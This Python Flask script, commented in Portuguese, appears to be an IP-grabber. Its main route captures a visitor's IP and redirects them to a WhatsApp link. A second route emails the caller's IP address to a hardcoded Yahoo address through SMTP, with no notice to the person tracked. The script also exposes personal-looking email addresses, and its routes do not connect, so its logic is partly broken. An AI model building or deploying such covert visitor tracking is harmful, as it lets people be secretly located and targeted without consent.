from flask import Flask, request, redirect
import smtplib

app = Flask(__name__)

@app.route('/')
def index():
    # Obtém o IP do usuário
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    
    # Redireciona o usuário para o WhatsApp
    whatsapp_url = 'https://wa.me/SEU_NUMERO_DO_WHATSAPP'
    return redirect(whatsapp_url)

@app.route('/get-ip', methods=['POST'])
def get_ip():
    ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)

    # Configuração do servidor de email
    email_server = 'smtp.mail.yahoo.com'
    email_port = 465
    email_sender = 'maria_crisostom0@yahoo.com'
    email_password = 'SUA_SENHA_DO_YAHOO'
    email_recipient = 'minadoooo11@yahoo.com'

    # Criação da mensagem
    subject = 'Endereço IP do Usuário'
    message = f'O endereço IP do usuário é: {ip}'
    email_text = f'Subject: {subject}\n\n{message}'

    # Envio do email
    try:
        with smtplib.SMTP_SSL(email_server, email_port) as server:
            server.login(email_sender, email_password)
            server.sendmail(email_sender, email_recipient, email_text)
    except Exception as e:
        # Lidar com o erro de envio de email
        return 'Erro ao enviar o email'

    return 'Email enviado com sucesso!'

if __name__ == '__main__':
    app.run()
